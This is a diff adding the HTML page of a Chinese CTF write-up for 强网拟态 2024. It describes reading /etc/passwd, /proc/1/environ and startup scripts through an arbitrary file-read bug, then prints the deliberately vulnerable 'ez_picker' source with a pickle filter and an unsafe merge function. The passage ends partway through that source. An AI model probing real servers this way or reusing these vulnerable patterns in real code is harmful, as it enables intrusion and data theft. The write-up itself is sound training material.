@@ -1,0 +1,1329 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  强网拟态 2024 | Ya1orin
+</title>
+<meta name="description" content="强网拟态 2024 Writeup"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="强网拟态 2024 | Ya1orin" />
+  <meta
+    property="og:description"
+    content="强网拟态 2024 Writeup"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2024/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2024-10-21T09:23:02&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-10T16:46:02&#43;08:00" /><meta property="article:tag" content="CTF" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="强网拟态 2024"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">强网拟态 2024</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#capoo-一血">capoo (一血)</a></li>
+        <li><a href="#ez_picker">ez_picker</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#xor">xor</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#ezflag">ezflag</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">pwn</a>
+      <ul>
+        <li><a href="#signin-revenge">signin revenge</a>
+          <ul>
+            <li><a href="#题目libc环境">题目libc环境</a></li>
+            <li><a href="#orw">ORW</a></li>
+          </ul>
+        </li>
+        <li><a href="#signin">signin</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-10-21 09:23:02 &#43;0800 CST" itemprop="datePublished"
+      >2024-10-21</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-10</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/writeup"
+      data-aos="zoom-in"
+      >WRITEUP</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="web">
+<a class="header-anchor" href="#web"></a>
+Web
+</h1><h2 id="capoo-一血">
+<a class="header-anchor" href="#capoo-%e4%b8%80%e8%a1%80"></a>
+capoo (一血)
+</h2><p>爽喽</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021093643112-333016867.png" alt="image-20241019162216319"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021093709026-2029109064.png" alt="image-20241019151935942"></p>
+<p>f12发<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021093741131-1763474644.png" alt="image-20241019152114885">现读的图片，感觉应该能任意文件读取，读一下<code>/etc/passwd</code></p>
+<p>发现能读，再看一下环境变量<code>/proc/1/environ</code>，没有</p>
+<p>再看一下<code>/proc/1/cmdline</code>，发现存在<code>/bin/sh/docker-entrypoint.sh</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021093821659-1694154678.png" alt="image-20241019152243867"></p>
+<p>再尝试一下start.sh</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021093836336-503712739.png" alt="image-20241019152349796"></p>
+<p>找到flag名称，直接读就能出flag</p>
+<h2 id="ez_picker">
+<a class="header-anchor" href="#ez_picker"></a>
+ez_picker
+</h2><p>源码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic</span> <span class="kn">import</span> <span class="n">Sanic</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic.response</span> <span class="kn">import</span> <span class="n">json</span><span class="p">,</span> <span class="n">file</span> <span class="k">as</span> <span class="n">file_</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic_cors</span> <span class="kn">import</span> <span class="n">CORS</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">key</span> <span class="kn">import</span> <span class="n">secret_key</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">builtins</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="s2">&#34;App&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickle_file</span> <span class="o">=</span> <span class="s2">&#34;data.pkl&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">my_object</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">safe_modules</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;math&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;datetime&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;json&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;collections&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">safe_names</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;sqrt&#39;</span><span class="p">,</span> <span class="s1">&#39;pow&#39;</span><span class="p">,</span> <span class="s1">&#39;sin&#39;</span><span class="p">,</span> <span class="s1">&#39;cos&#39;</span><span class="p">,</span> <span class="s1">&#39;tan&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;date&#39;</span><span class="p">,</span> <span class="s1">&#39;datetime&#39;</span><span class="p">,</span> <span class="s1">&#39;timedelta&#39;</span><span class="p">,</span> <span class="s1">&#39;timezone&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;loads&#39;</span><span class="p">,</span> <span class="s1">&#39;dumps&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;namedtuple&#39;</span><span class="p">,</span> <span class="s1">&#39;deque&#39;</span><span class="p">,</span> <span class="s1">&#39;Counter&#39;</span><span class="p">,</span> <span class="s1">&#39;defaultdict&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">module</span> <span class="ow">in</span> <span class="n">safe_modules</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">safe_names</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">&#34;global &#39;</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">&#39; is forbidden&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">restricted_loads</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">RestrictedUnpickler</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">CORS</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">supports_credentials</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">origins</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;http://localhost:8000&#34;</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.1:8000&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">token_required</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">def</span> <span class="nf">wrapper</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;token&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">token</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">secret_key</span><span class="p">),</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;HS256&#39;</span><span class="p">],</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;verify_signature&#34;</span><span class="p">:</span> <span class="kc">True</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">ExpiredSignatureError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;fail&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Token expired&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">401</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">InvalidTokenError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;fail&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid token&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">401</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;role&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;fail&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Permission Denied&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">401</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">await</span> <span class="n">func</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">wrapper</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">file_reader</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="s2">&#34;app.py&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
